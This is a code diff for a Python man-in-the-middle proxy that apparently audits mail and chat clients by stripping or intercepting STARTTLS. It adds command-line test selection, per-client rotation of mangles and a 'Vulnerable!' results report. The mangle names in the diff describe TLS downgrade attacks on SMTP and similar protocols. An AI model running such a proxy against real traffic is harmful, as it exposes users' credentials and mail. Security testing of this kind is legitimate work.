+        all_mangles = list(self.get_mangles(session.protocol.protocol_id))
+        new_index = 0
+        if client_mangle_history:
+            previous_result = client_mangle_history[-1]
+            new_index = (all_mangles.index(previous_result['mangle'])+1) % len(all_mangles)
+        mangle = all_mangles[new_index]
+            
+        self.results.append({'client':client_ip,
+                             'session':session,
+                             'mangle':mangle,
+                             'result':None}) 
+ 
+        #mangle = iter(self.get_mangles(session.protocol.protocol_id)).next()
+        logger.debug("<RewriteDispatcher  - changed mangle: %s new: %s>"%(mangle,"False" if len(client_mangle_history)>len(all_mangles) else "True"))
+        self.session_to_mangle[session] = mangle
+        return mangle
+        
+    def get_mangles(self, proto):
+        return self.mangles.get(proto,[])
         
     def mangle_server_data(self, session, data):
         data_orig = data
         logging.debug("%s [client] <= [server]          %s"%(session,repr(data)))
-        if self.get_attack(session.protocol.protocol_id):
-            #TODO: just use the first one for now
-            data = iter(self.get_attack(session.protocol.protocol_id)).next().mangle_server_data(session, data)
-        #if session.protocol.protocol_id==ProtocolDetect.PROTO_SMTP:
-        #    data = SMTP.StripFromCapabilities.mangle_server_data(session, data)
+        if self.get_mangle(session):
+            data = self.get_mangle(session).mangle_server_data(session, data, self)
         if data!=data_orig:
             logging.debug("%s [client] <= [server][mangled] %s"%(session,repr(data)))
         return data
 
-
     def mangle_client_data(self, session, data):
         data_orig = data
         logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
-        if self.get_attack(session.protocol.protocol_id):
+        if self.get_mangle(session):
             #TODO: just use the first one for now
-            data = iter(self.get_attack(session.protocol.protocol_id)).next().mangle_client_data(session, data)
-        #if session.protocol.protocol_id==ProtocolDetect.PROTO_SMTP:    # SMTP
-        #    data = SMTP.StripFromCapabilities.mangle_client_data(session, data)
+            data = self.get_mangle(session).mangle_client_data(session, data, self)
         if data!=data_orig:
             logging.debug("%s [client] => [server][mangled] %s"%(session,repr(data)))
         return data
     
-if __name__ == '__main__':
+def main():
+    import os
+    from optparse import OptionParser
     ret = 0
-    if not len(sys.argv)>1:
-        print ("""Usage:
-        %s <listen_ip> <listen_port> <forward_ip> <forward_port> [<mangle_class>]
-        
-            mangle_class ... SMTP.StripFromCapabilities, 
-                             SMTP.StripWithInvalidResponseCode, 
-                             SMTP.StripWithTemporaryError,
-                             SMTP.StripWithError,
-                             SMTP.UntrustedIntercept, 
-                             POP3.<tbd>,
-                             IMAP.<tbd>,
-                             FTP.<tbd>,
-                             NNTP.<tbd>,
-                             XMPP.<tbd>,                      
-        """)
-        sys.exit(1)
+    usage = """usage: %prog [options]
+        example: %prog --listen 0.0.0.0:25 --remote mail.server.tld:25 --tests *
+    """
+    parser = OptionParser(usage=usage)
+    parser.add_option("-v", "--verbose",
+                  action="store_true", dest="verbose", default=True,
+                  help="make lots of noise [default]")
+    parser.add_option("-l", "--listen", dest="listen", help="listen ip:port")
+    parser.add_option("-r", "--remote", dest="remote", help="target ip:port")
     
-    local_listen = (sys.argv[1], int(sys.argv[2]))
-    forward_to = (sys.argv[3],int(sys.argv[4]))
-    classname = sys.argv[5] if len(sys.argv)>5 else "SMTP.StripFromCapabilities"
-    ## hacky!
-    if "." in classname:
-        lastdot = classname.rfind(".")
-        cls = getattr(locals().get(classname[:lastdot]),classname[lastdot+1:])
-        
-    # magic
-    prx = ProxyServer(listen=local_listen, target=forward_to, buffer_size=4096, delay=0.00001)
+    all_tests = []
+    for proto in [t for t in dir(Tests) if not t.startswith("_")]:
+        for test in [t for t in dir(getattr(Tests,proto)) if not t.startswith("_")]:
+            all_tests.append("%s.%s"%(proto,test))
+    parser.add_option("-t", "--tests",
+                  default="*",
+                  help="Comma separated list of tests. * selects ALL. Available Tests: "+", ".join(all_tests)+""
+                  " [default: %default]")
+    
+    # parse args
+    (options, args) = parser.parse_args()
+    # normalize args
+    if options.verbose:
+        logger.setLevel(logging.DEBUG)
+    if not options.remote:
+        parser.print_help()
+        parser.error("mandatory option: remote")
+    else:
+        options.remote = options.remote.strip().split(":")
+        options.remote = (options.remote[0], int(options.remote[1]))
+    if not options.listen:
+        logger.warning("no listen port specified - falling back to 0.0.0.0:%d"%options.remote[1])
+        options.listen = ("0.0.0.0",options.remote[1])
+    else:
+        options.listen = options.listen.strip().split(":")
+        options.listen = (options.listen[0], int(options.listen[1]))
+    options.tests = [o.strip() for o in options.tests.strip().split(",")]
+    if "*" in options.tests:
+        options.tests = all_tests
+          
+    # ---- start up engines ----
+    prx = ProxyServer(listen=options.listen, target=options.remote, buffer_size=4096, delay=0.00001)
     logger.info("%s ready."%prx)
     rewrite = RewriteDispatcher()
-    rewrite.add(ProtocolDetect.PROTO_SMTP, cls)
     
+    for classname in options.tests:
+        try:
+            proto, test = classname.split('.',1)
+            cls_proto = getattr(globals().get("Tests"),proto)
+            cls_test = getattr(cls_proto, test)
+            rewrite.add(cls_proto._PORT, cls_test)
+            logger.debug("* added test (port:%-5d, proto:%8s): %s"%(cls_proto._PORT, proto, repr(cls_test)))
+        except Exception, e:
+            raise e
+
     logging.info( repr(rewrite))
     prx.set_callback("mangle_server_data", rewrite.mangle_server_data)
     prx.set_callback("mangle_client_data", rewrite.mangle_client_data)
@@ -724,4 +810,14 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         logger.warning( "Ctrl C - Stopping server")
         ret+=1
+        
+    logger.info(" -- analysis results --")
+    for client,resultlist in rewrite.get_results_by_clients().iteritems():
+        logger.info("[*] client: %s"%client)
+        for mangle, result in resultlist:
+            logger.info("    [%-11s] %s"%("Vulnerable!" if result else " ",repr(mangle)))
+        
     sys.exit(ret)
+    
+if __name__ == '__main__':
+    main()
